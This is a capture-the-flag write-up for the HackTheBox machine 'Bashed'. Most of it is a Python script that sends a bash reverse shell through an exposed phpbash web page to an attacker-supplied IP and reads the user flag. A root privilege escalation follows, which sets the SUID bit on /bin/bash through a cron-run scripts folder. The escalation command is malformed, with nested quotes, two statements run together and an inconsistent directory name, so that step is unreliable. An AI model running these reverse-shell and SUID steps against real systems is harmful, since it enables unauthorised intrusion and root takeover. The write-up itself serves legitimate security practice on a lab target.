---
title: Bashed Machine HackTheBox
date: 2022-11-11 00:22:25 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Description 

This machine will be pwned with a simple script, and an easy Priv Escalation.

>So lets run the following script, which will get us into the machine and report us the flag
{: .prompt-tip}

```python
#!/usr/bin/python3

from pwn import *
import signal, requests, time, sys, os

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+Ctrl
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 2:
    print("Modo de uso: %s + <ip-address>" % sys.argv[0])
    sys.exit(1)

#Declaracion de variables globales

ip_address = sys.argv[1]
main_url = "http://%s/dev/phpbash.min.php" % ip_address
header = {"Content-Type": "application/x-www-form-urlencoded"}
lport = 7007

def getAccess():

    data_post = {
        'cmd' : 'cd /var/www/html/dev; bash -c "bash -i >&/dev/tcp/<YOUR____IP>/7007 0>&1"'
      }

    r = requests.post(main_url, data=data_post, headers=header)
    
if __name__ == '__main__':

    try:
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.sendline("cd /home/arrexel")
    time.sleep(2)
    shell.sendline("cat user.txt")
    shell.interactive()
```
We can run the script with the following command:

```bash
python3 file_name.py target_ip
```
>Now we can submit user flag
{: .prompt-info}

Now, all we gotta do is:

```bash

cd /script
echo "import os os.system("chmod u+s /bin/bash")" > test.py
```
But why?

Well, in /scripts we can see 2 files: test.txt and test.py, from where the text.py text is moved written to test.py, so we can make /bin/bash a SUID.
If we ls -l, we can see test.txt is owned by root, se we can assum that anything inside test.py will also be run as root.

If we now wait 1 min, we can run:
```bash
/bin/bash -p
```
>And now we are able to cd into /root and submit the root flag!
{: .prompt-danger}
